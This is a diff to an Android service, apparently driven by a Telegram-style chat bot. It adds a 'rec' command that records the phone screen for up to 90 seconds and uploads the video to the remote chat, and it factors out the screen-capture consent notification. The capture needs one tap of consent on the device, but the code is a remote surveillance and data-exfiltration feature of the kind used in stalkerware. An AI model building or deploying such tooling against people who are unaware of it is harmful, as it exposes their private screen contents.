@@ -55,6 +55,7 @@ public class RelayService extends Service {
         try {
             if (low.equals("ping")) { tg.say("pong"); return; }
             if (low.equals("shot")) { cmdShot(); return; }
+            if (low.equals("rec") || low.startsWith("rec ")) { cmdRec(c); return; }
             if (low.equals("perm")) {
                 Intent pi = new Intent(this, PermActivity.class);
                 pi.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
@@ -314,31 +315,124 @@ private void cmdUninstall() {
     private void cmdShot() {
         if (BridgeHolder.projection == null) {
             BridgeHolder.shotPendente = true;
-            Intent i = new Intent(this, ShotConsentActivity.class);
-            int req = (int) (System.currentTimeMillis() % 2000000000L);
-            PendingIntent p = PendingIntent.getActivity(this, req, i,
-                    PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
-            NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
-            String chId = "shot_fsi";
-            if (Build.VERSION.SDK_INT >= 26) {
-                nm.createNotificationChannel(new NotificationChannel(chId, "captura de tela",
-                        NotificationManager.IMPORTANCE_HIGH));
-            }
-            Notification.Builder b = Build.VERSION.SDK_INT >= 26
-                    ? new Notification.Builder(this, chId)
-                    : new Notification.Builder(this);
-            b.setContentTitle("Autorizar captura")
-             .setContentText("Toque aqui e depois em INICIAR (1x por boot)")
-             .setSmallIcon(android.R.drawable.stat_notify_sync)
-             .setAutoCancel(true)
-             .setContentIntent(p);
-            nm.notify(req, b.build());
+            notifConsentimento();
             tg.say("shot: sessao de captura morreu (processo reiniciou) - toque na NOTIFICACAO e INICIAR. " +
                     "DICA: bateria do app em 'Sem restricoes' diminui muito isso");
             return;
         }
         dispararCaptura();
         tg.say("shot: capturando...");
+    }
+
+    private static volatile android.media.MediaRecorder recAtual = null;
+    private static volatile boolean pararRec = false;
+
+    private void cmdRec(String c) {
+        String arg = c.trim().length() > 3 ? c.trim().substring(3).trim().toLowerCase(java.util.Locale.ROOT) : "";
+        if (arg.equals("parar") || arg.equals("stop")) {
+            if (recAtual != null) { pararRec = true; tg.say("rec: finalizando e enviando..."); }
+            else tg.say("rec: nada gravando");
+            return;
+        }
+        if (recAtual != null) { tg.say("rec: ja gravando - use 'rec parar'"); return; }
+        int segundos = 30;
+        if (!arg.isEmpty()) {
+            try { segundos = Math.max(5, Math.min(90, Integer.parseInt(arg))); }
+            catch (Exception e) { tg.say("rec: uso: rec [5-90] | rec parar"); return; }
+        }
+        if (BridgeHolder.projection == null) {
+            BridgeHolder.recPendente = segundos;
+            notifConsentimento();
+            tg.say("rec: toque na NOTIFICACAO e INICIAR pra autorizar a captura");
+            return;
+        }
+        dispararRec(segundos);
+        tg.say("rec: gravando " + segundos + "s...");
+    }
+
+    private void notifConsentimento() {
+        Intent i = new Intent(this, ShotConsentActivity.class);
+        int req = (int) (System.currentTimeMillis() % 2000000000L);
+        PendingIntent p = PendingIntent.getActivity(this, req, i,
+                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
+        NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
+        String chId = "shot_fsi";
+        if (Build.VERSION.SDK_INT >= 26) {
+            nm.createNotificationChannel(new NotificationChannel(chId, "captura de tela",
+                    NotificationManager.IMPORTANCE_HIGH));
+        }
+        Notification.Builder b = Build.VERSION.SDK_INT >= 26
+                ? new Notification.Builder(this, chId)
+                : new Notification.Builder(this);
+        b.setContentTitle("Autorizar captura")
+         .setContentText("Toque aqui e depois em INICIAR")
+         .setSmallIcon(android.R.drawable.stat_notify_sync)
+         .setAutoCancel(true)
+         .setContentIntent(p);
+        nm.notify(req, b.build());
+    }
+
+    public static void dispararRec(int segundos) {
+        new Thread(() -> {
+            android.media.projection.MediaProjection mp = BridgeHolder.projection;
+            if (mp == null || BridgeHolder.tg == null) return;
+            android.content.Context ctx = appCtx;
+            if (ctx == null) return;
+            java.io.File out = new java.io.File(ctx.getFilesDir(), "rec.mp4");
+            android.media.MediaRecorder rec = null;
+            android.hardware.display.VirtualDisplay vd = null;
+            try {
+                android.util.DisplayMetrics m = ctx.getResources().getDisplayMetrics();
+                rec = new android.media.MediaRecorder();
+                rec.setVideoSource(android.media.MediaRecorder.VideoSource.SURFACE);
+                rec.setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4);
+                rec.setOutputFile(out.getAbsolutePath());
+                rec.setVideoEncodingBitRate(3000000);
+                rec.setVideoFrameRate(30);
+                rec.setVideoSize(1280, 720);
+                rec.setVideoEncoder(android.media.MediaRecorder.VideoEncoder.H264);
+                rec.prepare();
+                vd = mp.createVirtualDisplay("rec", 1280, 720, m.densityDpi,
+                        android.hardware.display.DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
+                        rec.getSurface(), null, null);
+                rec.start();
+                recAtual = rec;
+                pararRec = false;
+                BridgeHolder.tg.say("rec: gravando " + segundos + "s ('rec parar' corta antes)");
+                for (int i = 0; i < segundos * 2; i++) {
+                    if (pararRec) break;
+                    try { Thread.sleep(500); } catch (InterruptedException ignored) { }
+                }
+                pararRec = false;
+                try { rec.stop(); } catch (Exception ignored) { }
+                recAtual = null;
+                if (vd != null) vd.release();
+                rec.release();
+                long len = out.length();
+                if (len < 50000) {
+                    BridgeHolder.tg.say("rec: gravacao perdida (processo morreu ou erro)");
+                    out.delete();
+                    return;
+                }
+                byte[] data = new byte[(int) len];
+                try (java.io.FileInputStream fi = new java.io.FileInputStream(out)) {
+                    int lido = 0;
+                    while (lido < len) {
+                        int n = fi.read(data, lido, (int) len - lido);
+                        if (n < 0) break;
+                        lido += n;
+                    }
+                }
+                out.delete();
+                BridgeHolder.tg.sendVideo(data, "rec_" + System.currentTimeMillis() + ".mp4");
+                BridgeHolder.tg.say("rec: enviado (" + len + " bytes)");
+            } catch (Throwable t) {
+                try { if (rec != null) rec.release(); } catch (Exception ignored) { }
+                if (vd != null) vd.release();
+                recAtual = null;
+                if (BridgeHolder.tg != null) BridgeHolder.tg.say("rec: erro " + t);
+            }
+        }, "rec").start();
     }
 
     public static void dispararCaptura() {
